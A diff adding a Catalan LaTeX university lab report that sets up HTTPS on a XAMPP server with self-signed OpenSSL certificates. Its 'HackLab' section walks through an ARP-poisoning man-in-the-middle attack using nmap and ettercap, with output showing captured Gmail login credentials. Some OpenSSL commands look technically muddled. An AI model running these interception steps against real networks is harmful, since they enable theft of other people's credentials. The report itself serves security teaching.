@@ -1,0 +1,239 @@
+\documentclass[a4paper,11pt]{scrartcl}
+\usepackage[utf8x]{inputenc}
+\usepackage[catalan]{babel}
+\usepackage{titlesec}
+\usepackage{indentfirst}
+\usepackage{amsmath}
+\usepackage{float}
+\usepackage{graphicx}
+\usepackage{subfigure}
+\usepackage{booktabs}
+\usepackage{multirow}
+\usepackage{hyperref}
+\usepackage{url}
+\usepackage{multirow}
+\usepackage{minted} %wget http://minted.googlecode.com/hg/minted.sty
+
+% aptitude install texlive-fonts-extra
+\usepackage{newcent} %font mes wapa
+
+\graphicspath{{diagrames/}}
+
+% Estil de seccions
+\titleformat{\section}{\large\sectfont}{\thesection}{1em}{}
+\titleformat{\subsection}{\bfseries\sectfont}{\thesubsection}{1em}{}
+% Estil numeracio subseccions http://help-csli.stanford.edu/tex/latex-sections.shtml#number
+%\def\thesubsection{\alph{subsection})}
+
+\title{Teoria de la Informació i la Codificació: \\ Pràctica de seguretat}
+\author{ Bartomeu Miró Mateu \thanks{bartomeumiro a gmail punt com} \\
+	 Lluís Cortès Rullan \thanks{lluisbinet a gmail punt com} }
+
+\begin{document}
+
+  \maketitle
+
+  \begin{abstract}
+    Securització de un servidor web emprant OpenSSL.
+  \end{abstract}
+
+  \newpage
+
+\section{Introducció}
+
+
+
+\section{Configuració XAMPP}
+XAMPP és un paquet de programari que conté un servidor web, Apache; una base 
+de dades, MySQL i dos llenguatges per interaccionar amb ells, Perl i PHP. El
+fet de emprar el XAMPP és perqué és un paquet preparat per l'ús immediat i
+requereix poca configuració.
+
+En un entorn GNU/Linux senzillament s'ha de baixar el paquet i descomprimir-lo
+com a super-usuari a \texttt{/opt}
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+wget http://ignum.dl.sourceforge.net/project/xampp/XAMPP%20Linux/1.7.4/
+xampp-linux-1.7.4.tar.gz
+
+tar xvfz xampp-linux-1.7.4.tar.gz -C /opt
+\end{minted}
+
+Podem executar-lo amb la següent comanda i a continuació obrir un navegador
+web a \href{http://localhost}{localhost} per comprovar si funciona.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+/opt/lampp/lampp start
+\end{minted}
+
+\section{Configuració OpenSSL}
+Per la insta\lgem ació del OpenSSL pot fer-se baixant el paquet a la seva
+web\footnote{\url{http://openssl.org}} o directament amb el paquet pre-compilat
+de la distribució emprada. En en aquest cas la distribució emprada es Debian 
+GNU/Linux, així doncs el paquet a insta\lgem ar és el \texttt{openssl}
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+aptitude install openssl
+\end{minted}
+
+Cal esmentar que aquest paquet és sols per generar els certificats, l'Apache del XAMPP
+porta suport per OpenSSL per atendre les peticions i emprar les claus generades.
+
+Les claus mencionades és generen de la següent manera.
+En primer lloc generam la clau RSA, ens declaram autàrquics i no emprarem cap entitat
+oficial que la signi.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+openssl dsaparam -rand -genkey -out mevaRSA.key 1024
+\end{minted}
+
+Tot seguit generam la clau CA.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+openssl gendsa -des3 -out meuCA.key mevaRSA.key
+\end{minted}
+
+Aquest pas ens requereix una contrasenya, nosaltres establim \texttt{practicaseguretat}.
+
+Finalment empram la clau per generar el certificat, amb una caducitat d'un any i emprant
+x509.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+openssl req -new -x509 -days 365 -key meuCA.key -out nou.crt
+\end{minted}
+
+Un cop hem acabat posam aquests fitxers a la carpeta del XAMPP.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+cp mevaRSA.key /opt/lampp/etc/ssl.key
+cp nou.crt /opt/lampp/etc/ssl.crt
+\end{minted}
+
+Un cop fet això ja podem obrir el navegador emprant \emph{https} a \href{https://localhost}{localhost}
+i acceptar el certificat, assegurant-mos que sigui el correcte.
+
+Ja tenim securitzat en nostre servidor amb OpenSSL, ara nomes fa falta distribuir
+els certificats als usuaris perquè els posin al seu navegador i empraran connexions segures.
+
+\section{HackLab}
+En aquest apartat s'explica com saltar-se la seguretat OpenSSL prenent un parell de suposicions:
+
+\begin{itemize}
+  \item La víctima i l'atacant estan a la mateixa subxarxa.
+  \item La víctima ha d'acceptar un nou certifica SSL fals del qual l'adverteix el navegador.
+\end{itemize}
+
+La primera suposició és senzilla, simplement implica que ambdós clients estiguin connectats
+a la mateixa xarxa, fins i tot es factible amb xarxes sense fils o \emph{switch} sempre
+i quan es faci un enverinament ARP per fer creure que l'atacant és el punt d'accés
+i rebi els missatges.
+
+A continuació ens hem d'assegurar que el \texttt{ettercap} està configurat adequadament,
+concretament hem de observar que el fitxer \texttt{/etc/etter.conf} hi hagi els següents paràmetres;
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+[privs]
+ec_uid = 0
+ec_gid = 0
+\end{minted}
+
+També cal des-comentar les següents línies del fitxer, quedant de la manera següent:
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport
+%port -j REDIRECT --to-port %rport"
+redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport
+%port -j REDIRECT --to-port %rport"
+\end{minted}
+
+Ara hem de conèixer en quin escenari ens trobam, primer de tot identificar la nostra adreça IP
+i targeta de xarxa. La targeta de xarxa si es cablejada segurament serà \texttt{eth0},
+així doncs amb un \texttt{ifconfig eth0} hauríem de veure la nostra adreça IP al camp
+\texttt{inet addr}.
+
+Un cop fet això cercam les víctimes, una manera de fer-ho és emprant el programa \texttt{nmap},
+aquest llança \emph{pings} a totes les adreces de la nostra xarxa i mira quines responen.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+nmap -sP 192.168.1.0/24
+\end{minted}
+
+això ens respondrà amb un
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+Starting Nmap 5.21 ( http://nmap.org ) at 2011-05-24 12:23 CEST
+Nmap scan report for 192.168.1.40
+Host is up (0.0011s latency).
+Nmap scan report for 192.168.1.63
+Host is up (0.00062s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 29.89 seconds
+\end{minted}
+
+En el nostre cas la víctima és \texttt{192.168.1.63}, nosaltres som l'atacant
+amb la adreça \texttt{192.168.1.40}.
+
+Ara toca fer l'enverinament ARP perquè la víctima ens envii a nosaltres els paquets
+en lloc del \emph{router} i així poder-los veure i contestar. Aquesta tècnica també
+és coneguda com \emph{man in the middle}.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+ettercap -Tq -i eth0 -M arp:remote,oneway /192.168.1.63/ //
+\end{minted}
+
+Ara senzillament toca esperar que la víctima intenti loguejar i accepti el nostre
+certificat fals. En aquest instant la connexió estarà xifrada amb el nostre certificat
+i per tant podem desxifrar el missatge enviat. Tot això ho fa el \texttt{ettercap} per nosaltres.
+
+\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
+ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
+
+Listening on eth0... (Ethernet)
+
+  eth0 ->       00:0A:E4:33:D4:58     192.168.1.40     255.255.255.0
+
+Privileges dropped to UID 0 GID 0...
+
+  28 plugins
+  39 protocol dissectors
+  53 ports monitored
+7587 mac vendor fingerprint
+1698 tcp OS fingerprint
+2183 known services
+
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+* |==================================================>| 100.00 %
+
+1 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 192.168.1.63 00:23:18:B1:D2:92
+
+ GROUP 2 : ANY (all the hosts in the list)
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+HTTP : 209.85.227.104:443 -> USER: practicaopenssl  PASS: \emph{h4x0r_pass}  
+INFO: https://www.google.com/accounts/ServiceLogin?service=mail&passive=true&rm=
+false&continue=https://mail.google.com/mail/?ui=html&zy=l&bsv=llya694le36z&
+\end{minted}
+
+Com podem veure la víctima ha intentat loguejar al seu correu de Gmail. L'usuari és \emph{practicaopenssl}
+i la contrasenya \emph{h4x0r\_pass}. Això significa que ha rebut l'advertiment de que el certificat no
+era l'autèntic de la pàgina i segurament per resignació, desconeixement i ganes d'entrar al seu
+correu ha ignorat l'advertiment acceptant el nou certificat fraudulent.
+Aquest procediment funciona per totes les webs amb SSL que s'han provat, entre elles el Facebook, Lastfm...
+
+En resum, emprar \emph{https} no és garantia de res sinó es sap amb seguretat que el certificat emprat
+es el correcte.
+
+%http://www.youtube.com/watch?v=ESGV9zlo0Zo
+
+
+\input{peu}
+
+\end{document}
